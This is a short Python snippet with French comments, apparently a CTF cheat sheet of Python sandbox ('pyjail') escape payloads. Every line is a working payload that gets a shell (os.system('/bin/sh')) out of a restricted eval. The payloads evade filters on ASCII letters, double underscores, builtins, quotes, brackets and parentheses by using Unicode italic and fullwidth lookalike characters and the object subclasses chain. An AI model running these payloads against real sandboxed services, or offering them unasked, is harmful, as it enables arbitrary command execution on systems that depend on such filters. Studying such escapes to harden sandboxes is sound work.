```py -cwn
# https://lingojam.com/ItalicTextGenerator

# pas d'ASCII
𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() # import os;os.system("/bin/sh")

# pas de lettres ASCII, pas de double underscore, dans eval
_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵()) # bypass du double underscore via underscore + underscore unicode (https://www.compart.com/en/unicode/U+005F) -> U+FE33, U+FE34, U+FE4D, U+FE4E, U+FE4F, U+FF3F

# pas de lettres ASCII, pas de double underscore, pas de builtins, dans eval
()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦("\\157\\163").𝘴𝘺𝘴𝘵𝘦𝘮("\\57\\142\\151\\156\\57\\163\\150")

# pas de lettres ASCII, pas de double underscore, pas de builtins, pas de guillemets dans eval (>= python3.8)
[𝘺:=()._＿𝘥𝘰𝘤＿_,𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]

# pas de lettres ASCII, pas de double underscore, pas de builtins, pas de guillemets, pas de crochets dans eval (>= python3.8)
(𝘥:=()._＿𝘥𝘰𝘤＿_,d:=()._＿dir＿_().__class__(d),𝘴:=𝘥.𝘱𝘰𝘱(19),𝘥._＿𝘤𝘭𝘢𝘴𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_).𝘱𝘰𝘱(1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().𝘱𝘰𝘱(104).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.𝘱𝘰𝘱(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.𝘱𝘰𝘱(54)))

# pas de double underscore, pas de builtins, pas de guillemets, pas de parentheses dans eval, avec objet existant (>= python3.8)
class cobj:...
obj = cobj()

[d:=[]._＿doc＿_,o:=d[32],s:=d[17],h:=d[54],[obj[s+h] for obj._＿class＿_._＿getitem＿_ in [[obj[o+s] for obj._＿class＿_._＿getitem＿_ in [[+obj for obj._＿class＿_._＿pos＿_ in [[]._＿class＿_._＿mro＿_[1]._＿subclasses＿_]][0][104].load_module]][0].system]]]
```
